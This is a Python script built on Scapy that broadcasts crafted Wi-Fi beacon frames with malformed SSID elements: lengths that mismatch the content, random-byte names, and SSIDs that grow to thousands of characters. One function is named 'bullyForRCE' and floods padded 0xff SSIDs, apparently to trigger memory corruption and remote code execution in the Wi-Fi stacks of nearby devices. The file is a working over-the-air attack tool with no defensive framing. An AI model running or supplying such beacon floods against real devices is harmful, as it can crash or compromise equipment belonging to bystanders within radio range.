from scapy.all import *
import urllib.parse
from random import randbytes

iface = 'wlan1'
sender = 'ac:cb:12:ad:58:27'

def sendProbe(SSID,
			  repeat=3,
			  interval=0.100):
	dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
	addr2=sender, addr3=sender)
	beacon = Dot11Beacon()
	essid = Dot11Elt(ID='SSID',info=SSID, len=len(SSID))
	frame = RadioTap()/dot11/beacon/essid
	sendp(frame, iface=iface, inter=interval, count=repeat)

def sendProbeRaw(SSID='F',
				 repeat=3,
				 interval=0.150,
				 listedLen=512,
				 lenOverride=True):

		dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=sender, addr3=sender)
		beacon = Dot11Beacon()
		if lenOverride:
			essid = Dot11Elt(ID='SSID',info="F", len=RawVal(listedLen))
		else:
			essid = Dot11Elt(ID='SSID',info=RawVal(SSID), len=listedLen)
		frame = RadioTap()/dot11/beacon/essid
		sendp(frame, iface=iface, inter=interval, count=repeat)

def sendRandBytesBeacons(numOfBeacons=200,
						 lenOfSSIDs=20,
						 repeat=3,
						 interval=0.100):
	for i in range(numOfBeacons):
		SSID = randbytes(lenOfSSIDs)
		urlEncoded = urllib.parse.quote(SSID)
		print(f"\n{i} of {numOfBeacons}\n\tRepeats: {repeat}\n\tLength: {lenOfSSIDs}\n\tSSID: {urlEncoded}\n")
		sendProbe(SSID, repeat, interval)

def sendRandBytesBeaconsRaw(
	SSID='I-am-your-pony-waifu',
	numOfBeacons=200,
	lenOfSSIDs=255,
	listedLen=255,
	lenOverridei=False,
	repeat=1,
	interval=0.2):
	
	for i in range(numOfBeacons):
		#SSID = randbytes(lenOfSSIDs)
		urlEncoded = urllib.parse.quote(SSID)
		print(f"\n{i} of {numOfBeacons}\n\tRepeats: {repeat}\n\tListed Length: {listedLen}\n\tReal Length: {lenOfSSIDs}\n\tInterval: {interval} Seconds\n\tSSID: {urlEncoded}")
		sendProbeRaw(SSID, repeat, interval, listedLen, lenOverride=lenOverridei)

def overloadParamBeacon(max=10000,
						repeat=3,
						chari = "X",
						interval=0.2,
						listedLen=1):

	for i in range(max):
		num = i+1000
		SSIDI = chari*num
		SSID = f"{num}{SSIDI}"
		
		dot11 = Dot11(type=0,
			subtype=8,
			addr1='ff:ff:ff:ff:ff:ff',
			addr2=sender,
			addr3=sender)
		
		beacon = Dot11Beacon()
		
		essid = Dot11Elt(ID='SSID',
				   		info=RawVal(SSID),
						len=listedLen)
		
		frame = RadioTap()/dot11/beacon/essid

		print(f"\nSending {num}{chari}*{num} as SSID With Length Of {listedLen}")
		sendp(frame, iface=iface, inter=interval, count=repeat)

#overloadParamBeacon()



#$sendRandBytesBeaconsRaw(
#						SSID = b"YOU-SEEM-FUNDAMETALLY-FUN\x00\x0AI-THINK-ID-LIKE-TO-KNOW-YOU\x00\x0AI-FEEL-LIKE-BEING-YOUR-FRIEND\x00\x0AI-AM-YOUR-PONY-WAIFU",
#						numOfBeacons=200,
#						lenOfSSIDs=2,
#						listedLen=1,
#						lenOverridei=True,
#						repeat=3,
#						interval=0.1)

def bullyForRCE(max=10000,
						repeat=3,
						chari = "\xff",
						interval=0.2,
						listedLen=255):

	for i in range(max):
		chars = chari*i
		#SSID = f"n-{i}-YOU-SEEM-FUNDAMETALLY-FUN-I-THINK-ID-LIKE-TO-KNOW-YOU{chars}\xc6\x54\x00-I-FEEL-LIKE-BEING-YOUR-FRIEND-I-AM-YOUR-PONY-WAIFU"
		SSID = f"n{chars}"
		urlEncoded = urllib.parse.quote(SSID)
		
		dot11 = Dot11(type=0,
			subtype=8,
			addr1='ff:ff:ff:ff:ff:ff',
			addr2=sender,
			addr3=sender)
		
		beacon = Dot11Beacon()
		
		essid = Dot11Elt(ID='SSID',
				   		info=RawVal(SSID),
						len=listedLen)
		
		frame = RadioTap()/dot11/beacon/essid

		print(f"\nSending {i}/{max}\n\tWith SSID {urlEncoded}\n\tWith Length Of {listedLen}")
		sendp(frame, iface=iface, inter=interval, count=repeat)

sendProbeRaw(repeat=300)
#bullyForRCE()
#sendRandBytesBeacons(100, 20, 5, 0.1)
